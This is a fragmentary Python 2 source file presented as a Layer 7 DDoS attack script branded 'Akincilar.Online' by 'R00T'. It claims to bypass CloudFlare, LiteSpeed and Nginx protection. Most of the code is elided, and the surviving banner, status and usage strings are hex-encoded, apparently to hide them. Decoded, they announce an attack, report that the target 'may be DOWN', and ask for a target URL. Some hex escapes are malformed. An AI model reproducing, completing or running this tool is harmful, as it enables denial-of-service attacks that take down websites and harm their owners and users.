#!/usr/bin/env python
# G o o g l e C l o u d  S E C.  B y p a s s  S C.
# www.akincilar.online - Perl + Python DDos Script
...
class R00T(object):
    ...
    def exit(self):
        self.stats()
        print "\x44\x4F\x57\x4E\x21\x21\x21"
    ...
    def printHeader(self):
        ...
        print "\x44\x44\x6F\x53\x20\x53\x61\x4C\x64\x69\x72\x69\x73\x69\x20\x42\x61\x73\x4C\x61\x74\x69\x4C\x64\x69\x2E\x2E"
        print "\x43\x6F\x44\x65\x44\x20\x42\x79\x20\x5200\x54\x20\x2D\x20\x41\x6B\x69\x6E\x63\x69\x4C\x61\x72\x2E\x4F\x6E\x4C\x69\x6E\x65"
    def fire(self):
        ...
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                ...
                if self.counter[0] > 0 and self.counter[1] > 0 and self.last_counter[0] == self.counter[0] and self.counter[1] > self.last_counter[1]:
                    print "\t\x53\x65\x72\x76\x65\x72\x20\x6D\x61\x79\x20\x62\x65\x20\x44\x4F\x57\x4E\x21\x20\x42\x79\x20\x7200\x74\x2E\x70\x6C"
...
def usage():
    print
    print ""
    print "\x20\x41\x6B\x69\x6E\x63\x69\x6C\x61\x72\x2E\x4F\x6E\x6C\x69\x6E\x65\x20\x50\x72\x69\x76\x20\x4C\x61\x79\x65\x72\x37\x20\x41\x74\x74\x61\x63\x6B\x20\x53\x63\x72\x69\x70\x74\x20\x42\x79\x20\x52\x30\x30\x54\x20"
    print "\x20\x20\x20\x20\x20\x20\x20\x20\x4C\x69\x74\x65\x53\x70\x65\x65\x64\x20\x2D\x20\x4E\x67\x69\x78\x20\x2D\x20\x43\x6C\x6F\x75\x64\x46\x6C\x61\x72\x65\x20\x42\x79\x70\x61\x73\x73\x20\x20"
    print
    print ""
...
def main():
    ...
    try:
        ...
        if len(sys.argv) < 2:
            error("\x48\x65\x64\x65\x66\x20\x42\x65\x6C\x69\x72\x74\x69\x6E\x69\x7A\x20\x3D\x20\x70\x65\x72\x6C\x20\x72\x30\x30\x74\x2E\x70\x6C\x20\x68\x74\x74\x70\x3A\x2F\x2F\x74\x61\x72\x67\x65\x74\x73\x69\x74\x65\x2E\x63\x6F\x6D")
